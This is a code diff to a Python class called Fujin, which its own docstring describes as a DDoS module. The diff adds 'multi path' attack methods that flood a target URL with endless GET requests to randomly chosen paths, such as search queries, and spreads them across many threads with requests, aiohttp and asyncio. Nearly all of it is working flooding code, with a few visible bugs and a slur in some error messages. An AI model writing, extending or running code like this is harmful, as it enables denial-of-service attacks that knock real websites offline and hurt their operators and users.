@@ -7,6 +7,7 @@ import multiprocessing
 import asyncio
 import sys
 import urllib3
+import random
 from urllib.parse import urlparse
 
 
@@ -21,7 +22,8 @@ class Fujin:
                  redirects: bool | None = None,
                  timeout: int | None = None,
                  closing_message: bool | None = False,
-                 caching: bool | None = False) -> None:
+                 caching: bool | None = False,
+                 multi_path: dict | None = None) -> None:
         """
         A Object-Orientated DDoS Module
 
@@ -40,6 +42,9 @@ class Fujin:
         self.redirects = redirects
         self.timeout = timeout
         self.cookies = cookies
+
+        # Paths
+        self.multi_paths = multi_path
 
         # Initialise the data structures/holders for our multiprocessing functions to speed up our attacks
         self.sync_threads = []
@@ -179,7 +184,6 @@ class Fujin:
         request += "\r\n"
 
         return hostname, port, request
-    
 
     def get_status_code(self, response):
         """
@@ -191,7 +195,7 @@ class Fujin:
         status_code = status_line.split()[1]
         return status_code
 
-    
+
 
 
 
@@ -219,35 +223,87 @@ class Fujin:
         You will require the asyncio module to be installed and imported though.
         """
 
-        # Send A GET Request
-        r = self.session.get(self.url, headers=self.header)
+        try:
+            # Send A GET Request
+            r = self.session.get(self.url, headers=self.header)
 
-        # Assign to Object-Orientated Variable
-        self.status_code = r.status_code
-        self.connected += 1
-        self.result = self.connected, self.status_code
+            # Assign to Object-Orientated Variable
+            self.status_code = r.status_code
+            self.connected += 1
+            self.result = self.connected, self.status_code
 
-        print(f"{self.result}")
+            print(f"{self.result}")
+        except Exception as e:
+            print(f"Error: {e}")
+            await self.close_sessions()
     
-
     def sync_get(self) -> None:
         """
         A simple synchronous function that allows you to run a GET request
         """
-        
-        # Send A GET Request
-        r = self.session.get(self.url, 
-                             headers=self.header, 
-                             proxies=self.proxies, 
-                             data=self.data,
-                             allow_redirects=self.redirects)
 
-        # Assign to Object-Orientated Variable
-        self.status_code = r.status_code
-        self.connected += 1
-        self.result = self.connected, self.status_code
+        try:
+            # Send A GET Request
+            r = self.session.get(self.url, 
+                                headers=self.header, 
+                                proxies=self.proxies, 
+                                data=self.data,
+                                allow_redirects=self.redirects)
 
-        print(f"{self.result}")
+            # Assign to Object-Orientated Variable
+            self.status_code = r.status_code
+            self.connected += 1
+            self.result = self.connected, self.status_code
+
+            print(f"{self.result}")
+        except Exception as e:
+            print(f"Error: {e}")
+            self.close_sessions()
+
+    async def async_multi_path(self) -> None:
+        """
+        Attacks Multiple Paths
+        """
+
+        try:
+            random_path = random.choice(self.multi_paths)
+
+            r = self.session.get(f"{self.url}{random_path}",
+                                headers=self.header,
+                                proxies=self.proxies,
+                                data=self.data,
+                                allow_redirects=self.redirects)
+            
+            # Assign to OO Variable
+            self.status_code = r.status_code
+            self.connected += 1
+            self.result = self.connected, self.status_code
+        except Exception as e:
+            print(f"Error: {e}")
+            await self.close_sessions_a()
+
+    def sync_multi_path(self) -> None:
+        """
+        Attacks Multiple Paths
+        """
+
+        try:
+            random_path = random.choice(self.multi_paths)
+
+            r = self.session.get(f"{self.url}{random_path}",
+                                headers=self.header,
+                                proxies=self.proxies,
+                                data=self.data,
+                                allow_redirects=self.redirects)
+            
+            # Assign to OO Variable
+            self.status_code = r.status_code
+            self.connected += 1
+            self.result = self.connected, self.status_code
+        except Exception as e:
+            print(f"Error: {e}")
+            self.close_sessions()
+
 
     
     ### AIOHTTP GET REQUEST CALLS ###
@@ -268,6 +324,26 @@ class Fujin:
         except Exception as e:
             print(f"Error: {e}")
             self.close_sessions()
+
+    async def aio_multi_path_attack(self) -> None:
+        """
+        Sends Attacks to multiple paths
+
+        Fujin(multi_path=["/search?q=fee", "/search?q=coff", "/search?q=coffee"])
+        """
+
+        try:
+            random_path = random.choice(self.multi_paths)
+            async with aiohttp.ClientSession() as session:
+                async with session.get(f"{self.url}{random_path}") as sesh:
+                    self.connected += 1
+                    self.status = sesh.status
+                    self.result = self.connected, self.status
+                    print(f"{self.result}")
+        except Exception as e:
+            print(f"Error: {e}")
+            await self.close_sessions_a()
+
 
 
     ### URLLIB GET REQUEST CALLS ###
@@ -300,8 +376,9 @@ class Fujin:
             print(f"{self.result}")
         except Exception as e:
             print(f"Error: {e}")
-            self.close_sessions()
+            await self.close_sessions_a()
     
+
 
     ### SOCKET GET REQUEST CALLS ###
     def socket_sync_get(self) -> None:
@@ -358,7 +435,7 @@ class Fujin:
             print(f"{self.result}")
         except Exception as e:
             print(f"Error: {e}")
-            self.close_sessions()
+            await self.close_sessions_a()
 
 
     
@@ -489,9 +566,44 @@ class Fujin:
             self.close_sessions()
 
 
+    ### Multi Path Attacks ###
+    def begin_multi_path_aio_attack(self) -> None:
+        """
+        """
+
+        try:
+            while 1:
+                asyncio.run(self.aio_multi_path_attack())
+        except Exception as e:
+            print(f"Error: {e}")
+            self.close_sessions()
+    
+    def begin_multi_path_async_requests_attack(self) -> None:
+        """
+        """
+
+        try:
+            while 1:
+                asyncio.run(self.async_get())
+        except Exception as e:
+            print(f"Error: {e}")
+            self.close_sessions()
+
+    def begin_multi_path_sync_requests_attack(self) -> None:
+        """
+        """
+
+        try:
+            while 1:
+                asyncio.run(self.sync_get())
+        except Exception as e:
+            print(f"Error: {e}")
+            self.close_sessions()
+
+
     
 
-
+    
     #
     # Threading Attacks
     #
@@ -560,7 +672,6 @@ class Fujin:
             print("Choose a window manager ya retard")
             self.close_sessions()
 
-
     def thread_sync_attack(self, 
                            threads: int | None = None, 
                            daemon: bool | None = None,
@@ -620,6 +731,62 @@ class Fujin:
             print("Choose a window manager ya retard")
             self.close_sessions()
 
+    def thread_multi_path_async_requests_attack(self,
+                                     threads: int | None = None,
+                                     daemon: bool | None = None,
+                                     threads_name: str | None = None) -> None:
+        
+        if threads == None:
+            print(f"Error: we need an object within the threads parameter.")
+            self.close_sessions()
+
+        if threads_name == None: threads_name = "FUJIN"
+        if daemon == None: daemon = True
+
+        for x in range(threads):
+            t = threading.Thread(target=self.begin_multi_path_async_requests_attack, name=threads_name, daemon=daemon)
+            t.start()
+            self.async_threads.append(t)
+        for x in range(threads):
+            self.async_threads[x].join()
+
+    def thread_multi_path_sync_requests_attack(self,
+                                     threads: int | None = None,
+                                     daemon: bool | None = None,
+                                     threads_name: str | None = None) -> None:
+        
+        if threads == None:
+            print(f"Error: we need an object within the threads parameter.")
+            self.close_sessions()
+
+        if threads_name == None: threads_name = "FUJIN"
+        if daemon == None: daemon = True
+
+        for x in range(threads):
+            t = threading.Thread(target=self.begin_multi_path_sync_requests_attack, name=threads_name, daemon=daemon)
+            t.start()
+            self.async_threads.append(t)
+        for x in range(threads):
+            self.async_threads[x].join()
+
+    def thread_multi_path_aio_attack(self,
+                                     threads: int | None = None,
+                                     daemon: bool | None = None,
+                                     threads_name: str | None = None) -> None:
+        
+        if threads == None:
+            print(f"Error: we need an object within the threads parameter.")
+            self.close_sessions()
+
+        if threads_name == None: threads_name = "FUJIN"
+        if daemon == None: daemon = True
+
+        for x in range(threads):
+            t = threading.Thread(target=self.begin_aio_multi_path_attack, name=threads_name, daemon=daemon)
+            t.start()
+            self.async_threads.append(t)
+        for x in range(threads):
+            self.async_threads[x].join()
 
 
 
@@ -687,7 +854,6 @@ class Fujin:
         else:
             print("Choose a pooling manager ya sausage !!!")
             self.close_sessions()
-
 
     def multiproc_async_attack(self, 
                                number_of_processes: int | None = None, 
